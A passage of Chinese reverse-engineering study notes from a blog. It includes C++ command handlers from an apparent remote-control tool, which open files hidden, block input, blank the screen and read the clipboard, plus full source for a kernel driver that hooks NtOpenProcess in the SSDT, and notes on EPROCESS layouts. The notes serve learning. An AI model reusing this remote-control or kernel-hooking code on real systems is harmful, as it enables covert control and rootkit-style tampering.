COMMAND_STOP:</span><br><span class="line"><span class="built_in">StopTransfer</span>();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> COMMAND_SET_TRANSFER_MODE:</span><br><span class="line"><span class="built_in">SetTransferMode</span>(lpBuffer + <span class="number">1</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> COMMAND_FILE_SIZE:</span><br><span class="line"><span class="built_in">CreateLocalRecvFile</span>(lpBuffer + <span class="number">1</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> COMMAND_FILE_DATA:</span><br><span class="line"><span class="built_in">WriteLocalRecvFile</span>(lpBuffer + <span class="number">1</span>, nSize <span class="number">-1</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> COMMAND_OPEN_FILE_SHOW:</span><br><span class="line"><span class="built_in">OpenFile</span>((<span class="type">char</span> *)lpBuffer + <span class="number">1</span>, SW_SHOW);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> COMMAND_OPEN_FILE_HIDE:</span><br><span class="line"><span class="built_in">OpenFile</span>((<span class="type">char</span> *)lpBuffer + <span class="number">1</span>, SW_HIDE);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的收到的包基本都是路径 进行的操作其实也就是找到路径对应的管理 然后进行操作就成</p><h5 id="egIuX">ScreenManager</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CScreenManager::OnReceive</span><span class="params">(LPBYTE lpBuffer, UINT nSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">switch</span> (lpBuffer[<span class="number">0</span>])</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">case</span> COMMAND_NEXT:</span><br><span class="line">                        <span class="comment">// 通知内核远程控制端对话框已打开，WaitForDialogOpen可以返回</span></span><br><span class="line">                        <span class="built_in">NotifyDialogIsOpen</span>();</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> COMMAND_SCREEN_RESET:</span><br><span class="line">                        <span class="comment">//重启屏幕捕获子系统</span></span><br><span class="line">                        <span class="built_in">ResetScreen</span>(*(LPBYTE)&amp;lpBuffer[<span class="number">1</span>]);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> COMMAND_ALGORITHM_RESET:</span><br><span class="line">                        <span class="comment">//设置屏幕捕获的算法</span></span><br><span class="line">                        m_bAlgorithm = *(LPBYTE)&amp;lpBuffer[<span class="number">1</span>];</span><br><span class="line">                        m_pScreenSpy-&gt;<span class="built_in">setAlgorithm</span>(m_bAlgorithm);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> COMMAND_SCREEN_CTRL_ALT_DEL:</span><br><span class="line">                        <span class="comment">//Ctrl+Alt+Del</span></span><br><span class="line">                        ::<span class="built_in">SimulateCtrlAltDel</span>();</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> COMMAND_SCREEN_CONTROL:</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="comment">// 远程仍然可以操作</span></span><br><span class="line">                            <span class="built_in">BlockInput</span>(<span class="literal">false</span>);</span><br><span class="line">                            <span class="built_in">ProcessCommand</span>(lpBuffer + <span class="number">1</span>, nSize - <span class="number">1</span>);<span class="comment">//挪动鼠标</span></span><br><span class="line">                            <span class="built_in">BlockInput</span>(m_bIsBlockInput);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> COMMAND_SCREEN_BLOCK_INPUT: <span class="comment">//ControlThread里锁定</span></span><br><span class="line">                        m_bIsBlockInput = *(LPBYTE)&amp;lpBuffer[<span class="number">1</span>];</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> COMMAND_SCREEN_BLANK:</span><br><span class="line">                        m_bIsBlankScreen = *(LPBYTE)&amp;lpBuffer[<span class="number">1</span>];</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> COMMAND_SCREEN_CAPTURE_LAYER:</span><br><span class="line">                        m_bIsCaptureLayer = *(LPBYTE)&amp;lpBuffer[<span class="number">1</span>];</span><br><span class="line">                        m_pScreenSpy-&gt;<span class="built_in">setCaptureLayer</span>(m_bIsCaptureLayer);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> COMMAND_SCREEN_GET_CLIPBOARD:</span><br><span class="line">                        <span class="built_in">SendLocalClipboard</span>();</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> COMMAND_SCREEN_SET_CLIPBOARD:</span><br><span class="line">                        <span class="built_in">UpdateLocalClipboard</span>((<span class="type">char</span> *)lpBuffer + <span class="number">1</span>, nSize - <span class="number">1</span>);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">default</span>:</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;<span class="built_in">catch</span>(...)&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 逆向行驶 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 项目 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WindowsStudy03-进程线程</title>
      <link href="/2025/04/30/WindowsStudy03-%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/"/>
      <url>/2025/04/30/WindowsStudy03-%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p>系统调用、进程、线程</p><span id="more"></span><h2 id="qi9Ko">系统调用</h2><p>我只能说，windows真是等级森严啊</p><p>假如说我们要调用ControlDeviceIo这个API，那么会经过kernel32.dll-&gt;kernelbase.dll-&gt;ntdll.dll-&gt;ntoskrnl.exe-&gt;xxx-&gt;hal.dll</p><p>差不多就是层层审批，所以这也解释了为什么说有的函数出自kernel32.dll但是用ida看的时候却发现，里面的实现仅有一个call指令，原来是在向下蔓延<img src="/.io//tool\blog\source\postpic\windows3\1.png" loading="lazy"></p><p> kernel32.dll.OpenProcess—&gt;kernelBase.dll.OpenProcess–&gt;ntdll.dll.ZwOpenProcess–&gt;0x7ffe0300–&gt;sysenter–&gt;内核</p><h3 id="Gopqg">SSDT和ShadowSSDT表</h3>ntdll.dll和user32.dll gdt32.dll访问内核时，用到的函数表<p>里面存储了四个元素 函数表 服务调用次数统计 函数个数 参数表</p><p>SSDT表中基本存储无通信的内核函数，另一个存的就是有通信的了（不全是</p><p>这涉及到一个东西，服务号，比如pwn中最常见的system就是0x2b，这就是服务号，参数表查询和函数表查询都是通过服务号偏移拿到的(举例仅供参考，这个是linux系统的服务号)</p><p>自己定义</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">__SSDTItem</span></span><br><span class="line">&#123;</span><br><span class="line">    PULONG funcTable;</span><br><span class="line">    ULONG count;</span><br><span class="line">    ULONG funcMax;</span><br><span class="line">    PUCHAR paremTable;</span><br><span class="line">&#125;SSDTItem,*PSSDTItem</span><br><span class="line"></span><br><span class="line">EXTERN_C PSSDTItem KeServiceDescriptorTable;</span><br></pre></td></tr></table></figure><h3 id="gO4mE">syscall</h3>嗯，这节课相当于分析了，sysentry实现细节，总结来说就是三个步骤<p>1.保存环境，搞新环境</p><p>2.复制参数</p><p>3.CALL</p><p>不过细细下来分析还是很复杂的，后面如果用到再说吧</p><p>这个里面分析好像就能跟着学很多比如</p><h3 id="KV04j">IRQL</h3>代码等级，0 1 2，代码等级2号要大于1号大于0号，运行起来优先级也会高，比如说键盘和语雀，我输入一个'a'，语雀会立马出现，是因为键盘的等级高，它可以让语雀中断先执行键盘，然后回去执行语雀，大致是这个意思<h3 id="cpkXC">syscall返回部分</h3>返回部分还有有一个R3esp设置回去，这里作用主要在R0调用R0然后返回R3要返回栈环境的<h2 id="xCk7z">SSDT_HOOK</h2><h3 id="YyU2K">Cr0 MDL</h3>Cr0这个词我都差点忘了<p>是系统内的控制寄存器之一。控制寄存器是一些特殊的寄存器，它们可以控制CPU的一些重要特性。</p><p>0位是保护允许位PE(Protedted Enable)，用于启动保护模式，如果PE位置1，则保护模式启动，如果PE&#x3D;0，则在实模式下运行。</p><p>1 位是监控协处理位MP(Moniter coprocessor)，它与第3位一起决定：当TS&#x3D;1时操作码WAIT是否产生一个“协处理器不能使用”的出错信号。第3位是任务转换位(Task Switch)，当一个任务转换完成之后，自动将它置1。随着TS&#x3D;1，就不能使用协处理器。</p><p>CR0的第2位是模拟协处理器位 EM (Emulate coprocessor)，如果EM&#x3D;1，则不能使用协处理器，如果EM&#x3D;0，则允许使用协处理器。</p><p>第4位是微处理器的扩展类型位 ET(Processor Extension Type)，其内保存着处理器扩展类型的信息，如果ET&#x3D;0，则标识系统使用的是287协处理器，如果 ET&#x3D;1，则表示系统使用的是387浮点协处理器。</p><p>CR0的第31位是分页允许位(Paging Enable)，它表示芯片上的分页部件是否允许工作。</p><p>CR0的第16位是写保护未即WP位(486系列之后)，只要将这一位置0就可以禁用写保护，置1则可将其恢复。</p><p>在网上找了一个文章补了一下</p><p>简单来讲就是决定当前代码是否可写</p><p>但是在内核中没有Virtualprotect这样的函数，所以要用MDL，也是用来改保护的</p><h3 id="WRoTt">源码</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;ntifs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;ntimage.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntddk.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">__SSDTItem</span></span><br><span class="line">&#123;</span><br><span class="line">    PULONG funcTable;</span><br><span class="line">    ULONG count;</span><br><span class="line">    ULONG funcMax;</span><br><span class="line">    PUCHAR paremTable;</span><br><span class="line">&#125;SSDTItem, * PSSDTItem;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">__SSDTservice</span> </span><br><span class="line">&#123;</span><br><span class="line">    SSDTItem ssdt;</span><br><span class="line">    SSDTItem sssdt;</span><br><span class="line">&#125;SSDTservice,* PSSDTservice;</span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS NTAPI <span class="title">MyOpenProcess</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_ PHANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ ACCESS_MASK DesiredAccess,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ POBJECT_ATTRIBUTES ObjectAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ PCLIENT_ID ClientId</span></span></span><br><span class="line"><span class="params"><span class="function">)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">DbgPrintEx</span>(<span class="number">77</span>, <span class="number">0</span>, <span class="string">&quot;helloworld\t\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">NtOpenProcess</span>(ProcessHandle, DesiredAccess, ObjectAttributes, ClientId);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">EXTERN_C PSSDTservice KeServiceDescriptorTable;</span><br><span class="line"></span><br><span class="line"><span class="function">PVOID <span class="title">MDLmAPvIRTUAL</span><span class="params">(PVOID VirtualAddress, ULONG_PTR len, MODE mode, PMDL *Retpmdl)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PMDL pmdl = <span class="built_in">IoAllocateMdl</span>(VirtualAddress, len, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    BOOLEAN isLock = FALSE;</span><br><span class="line">    PULONG map = <span class="literal">NULL</span>;</span><br><span class="line">    __try</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">MmProbeAndLockPages</span>(pmdl, mode, IoReadAccess);    <span class="comment">//锁页</span></span><br><span class="line">        isLock = TRUE;</span><br><span class="line">        map = <span class="built_in">MmMapLockedPagesSpecifyCache</span>(pmdl, mode, MmNonCached, <span class="literal">NULL</span>, FALSE, NormalPagePriority);</span><br><span class="line">    &#125;</span><br><span class="line">    __except (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        map = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">if</span> (isLock)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">MmUnlockPages</span>(pmdl);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (pmdl)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">IoFreeMdl</span>(pmdl);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!map)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    *Retpmdl = pmdl;</span><br><span class="line">    <span class="keyword">return</span> map;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">PVOID <span class="title">MDUnLmAPvIRTUAL</span><span class="params">(PVOID mapAddress, PMDL pmdl)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">MmUnmapLockedPages</span>(mapAddress, pmdl);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">MmUnlockPages</span>(pmdl);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">IoFreeMdl</span>(pmdl);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">KernelSleep</span><span class="params">(ULONG ms, BOOLEAN isAlert)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LARGE_INTEGER inTime = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    inTime.QuadPart = <span class="number">-10000</span>;</span><br><span class="line">    inTime.QuadPart *= ms;</span><br><span class="line">    <span class="built_in">KeDelayExecutionThread</span>(KernelMode, isAlert, &amp;inTime);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">DriverUnload</span><span class="params">(PDRIVER_OBJECT pDriver)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PUCHAR tempFuncTable = KeServiceDescriptorTable-&gt;ssdt.funcTable;</span><br><span class="line">    PMDL pmdl;</span><br><span class="line">    PULONG map = <span class="built_in">MDLmAPvIRTUAL</span>(tempFuncTable, PAGE_SIZE, KernelMode, &amp;pmdl);</span><br><span class="line">    <span class="keyword">if</span> (map)</span><br><span class="line">    &#123;</span><br><span class="line">        map[<span class="number">0xBE</span>] = (ULONG)NtOpenProcess;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">MDUnLmAPvIRTUAL</span>(map, pmdl);</span><br><span class="line">    <span class="built_in">KernelSleep</span>(<span class="number">300</span>, FALSE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT pDriver, PUNICODE_STRING pPeg)</span> </span>&#123;</span><br><span class="line">    PUCHAR tempFuncTable = KeServiceDescriptorTable-&gt;ssdt.funcTable;</span><br><span class="line">    PMDL pmdl;</span><br><span class="line">    PULONG map = <span class="built_in">MDLmAPvIRTUAL</span>(tempFuncTable, PAGE_SIZE, KernelMode, &amp;pmdl);</span><br><span class="line">    <span class="keyword">if</span> (map)</span><br><span class="line">    &#123;</span><br><span class="line">        map[<span class="number">0xBE</span>] = (ULONG)MyOpenProcess;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">MDUnLmAPvIRTUAL</span>(map, pmdl);</span><br><span class="line">    </span><br><span class="line">    pDriver-&gt;DriverUnload = DriverUnload;</span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Z6Kdu">改进</h3>`MmProbeAndLockPages`这个创建页的函数效率很低，可以用其他API代替如: `MmBuildForNonPagePool`<p>区别在于锁页</p><h2 id="pbCv8">API</h2>`IoAllocateMdl`创建一个页描述符<p><code>MmProbeAndLockPages</code>锁页(挂页并且上梭)</p><p><code>MmMapLockedPagesSpecifyCache</code>访问页(解锁访问)</p><h2 id="o36JI">进程</h2><h3 id="DgUFu">结构</h3>进程刚开始创建仅仅是有一个空间，和对进程的描述结构，实际上就是申请了一片地用于进程<h3 id="cS3nQ">相关windbg</h3>`EPROCESS`进程结构体(PEB?)指令 `dt _EPROCESS Addrxxx`<p><code>KPROCESS</code>EPROCESS的第一个成员指令 <code>dt _KPROCESS AAddrxxx</code></p><h3 id="uaedH">内核小知识</h3>linux使用的是宏内核，线程调度，内存，进程管理，文件管理是一体的，紧密联系。模块无法抽出<p>win用的是微内核，线程调度，内存，进程管理，对象的管理，是可以抽出来的</p><p>K_系列封装 微内核层</p><p>E_封装 执行体层</p><h3 id="BUsIv">样本分析</h3><h4 id="UlMUW">EPROCESS</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">+0x000 Pcb              : _KPROCESSKPROCESS</span><br><span class="line">+0x098 ProcessLock      : _EX_PUSH_LOCK锁-字段成员</span><br><span class="line">+0x0a0 CreateTime       : _LARGE_INTEGER 0x01dbb81f`fc377b28开始时间</span><br><span class="line">+0x0a8 ExitTime         : _LARGE_INTEGER 0x0结束时间</span><br><span class="line">+0x0b0 RundownProtect   : _EX_RUNDOWN_REF锁-标志位</span><br><span class="line">+0x0b4 UniqueProcessId  : 0x00000c68 Void</span><br><span class="line">+0x0b8 ActiveProcessLinks : _LIST_ENTRY [ 0x83f4dd70 - 0x87698bb0 ]</span><br><span class="line">+0x0c0 ProcessQuotaUsage : [2] 0xd5c</span><br><span class="line">+0x0c8 ProcessQuotaPeak : [2] 0xdd4</span><br><span class="line">+0x0d0 CommitCharge     : 0x100</span><br><span class="line">+0x0d4 QuotaBlock       : 0x8733e940 _EPROCESS_QUOTA_BLOCK</span><br><span class="line">+0x0d8 CpuQuotaBlock    : (null) </span><br><span class="line">+0x0dc PeakVirtualSize  : 0x4480000</span><br><span class="line">+0x0e0 VirtualSize      : 0x447e000</span><br><span class="line">+0x0e4 SessionProcessLinks : _LIST_ENTRY [ 0x8d44e010 - 0x87698bdc ]</span><br><span class="line">+0x0ec DebugPort        : (null) </span><br><span class="line">+0x0f0 ExceptionPortData : 0x8719df00 Void</span><br><span class="line">+0x0f0 ExceptionPortValue : 0x8719df00</span><br><span class="line">+0x0f0 ExceptionPortState : 0y000</span><br><span class="line">+0x0f4 ObjectTable      : 0xb02d9828 _HANDLE_TABLE</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="bh6WJ">KRPOCESS</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">+0x000 Header           : _DISPATCHER_HEADER</span><br><span class="line">+0x010 ProfileListHead  : _LIST_ENTRY [ 0x85770580 - 0x85770580 ]</span><br><span class="line">+0x018 DirectoryTableBase : 0x3ea6f680//cr3</span><br><span class="line">+0x01c LdtDescriptor    : _KGDTENTRY</span><br><span class="line">+0x024 Int21Descriptor  : _KIDTENTRY</span><br><span class="line">+0x02c ThreadListHead   : _LIST_ENTRY [ 0x85720b10 - 0x85720b10 ]//线程链表</span><br><span class="line">+0x034 ProcessLock      : 0//修改成员同步锁</span><br><span class="line">+0x038 Affinity         : _KAFFINITY_EX//亲核性在哪个CPU核跑</span><br><span class="line">+0x044 ReadyListHead    : _LIST_ENTRY [ 0x857705b4 - 0x857705b4 ]//进程下的就绪线程链表</span><br><span class="line">+0x04c SwapListEntry    : _SINGLE_LIST_ENTRY//磁盘交换链表</span><br><span class="line">+0x050 ActiveProcessors : _KAFFINITY_EX//当前进程下活动的核</span><br><span class="line">+0x05c AutoAlignment    : 0y0//自动对齐</span><br><span class="line">+0x05c DisableBoost     : 0y0//和线程优先级有关</span><br><span class="line">+0x05c DisableQuantum   : 0y0//是否关闭进程下线程时间碎片机制</span><br><span class="line">+0x05c ActiveGroupsMask : 0y1</span><br><span class="line">+0x05c ReservedFlags    : 0y0000000000000000000000000000 (0)</span><br><span class="line">+0x05c ProcessFlags     : 0n8</span><br><span class="line">+0x060 BasePriority     : 8 &#x27;&#x27;//线程继承进程的基本优先级</span><br><span class="line">+0x061 QuantumReset     : 18 &#x27;&#x27;//线程的时间碎片基础值</span><br><span class="line">+0x062 Visited          : 0 &#x27;&#x27;</span><br><span class="line">+0x063 Unused3          : 0 &#x27;&#x27;</span><br><span class="line">+0x064 ThreadSeed       : [1] 0</span><br><span class="line">+0x068 IdealNode        : [1] 0</span><br><span class="line">+0x06a IdealGlobalNode  : 0</span><br><span class="line">+0x06c Flags            : _KEXECUTE_OPTIONS//关闭SEH机制</span><br><span class="line">+0x06d AddressPolicy    : 0 &#x27;&#x27;</span><br><span class="line">+0x06e IopmOffset       : 0x20ac</span><br><span class="line">+0x070 Unused4          : 0</span><br><span class="line">+0x074 StackCount       : _KSTACK_COUNT</span><br><span class="line">+0x078 ProcessListEntry : _LIST_ENTRY [ 0x0 - 0x0 ]</span><br><span class="line">+0x080 CycleTime        : 0</span><br><span class="line">+0x088 KernelTime       : 0</span><br><span class="line">+0x08c UserTime         : 0</span><br><span class="line">+0x090 VdmTrapcHandler  : (null) </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 逆向行驶 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows深度学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WindowsStudy02-初窥驱动</title>
      <link href="/2025/04/17/WindowsStudy02-%E5%88%9D%E7%AA%A5%E9%A9%B1%E5%8A%A8/"/>
      <url>/2025/04/17/WindowsStudy02-%E5%88%9D%E7%AA%A5%E9%A9%B1%E5%8A%A8/</url>
      
        <content type="html"><![CDATA[<p>简单的学习并编写驱动程序</p><span id="more"></span><p>首先要改属性</p><p>注意：配置是所有配置，平台不知道为什么我这里只能x86</p><p>C&#x2F;C++-&gt;常规-&gt;将警告视为错误-&gt;否</p><p>Driver Settings-&gt;Target OS Version-&gt;win7</p><p>SDL检查也关了</p><h2 id="ppK1D">模板</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;ntifs.h&gt;</span></span></span><br><span class="line">VOID <span class="title function_">DriverUnload</span><span class="params">(PDRIVER_OBJECT pDriver)</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">DriverEntry</span><span class="params">(PDRIVER_OBJECT pDriver, PUNICODE_STRING pPeg)</span> &#123;</span><br><span class="line">    pDriver-&gt;DriverUnload = DriverUnload;</span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="x9J6f">helloworld</h2>基本框架其实最开始就遇到了，在配置环境的时候<p>简单解释，DriverUnload是自己完善的卸载函数，DiverEntry是驱动的主函数，也就是加载的时候就会被引用</p><p>参数一-pDiver是该驱动的”对象”，其实这个也好理解，pDriver-&gt;DriverUnload是给驱动挂载卸载函数，最终返回正确，第二个参数是安装路径，驱动安装的路径</p><p>printf平替是DbgPrintEx，前两个参数别管，后面跟着就好</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 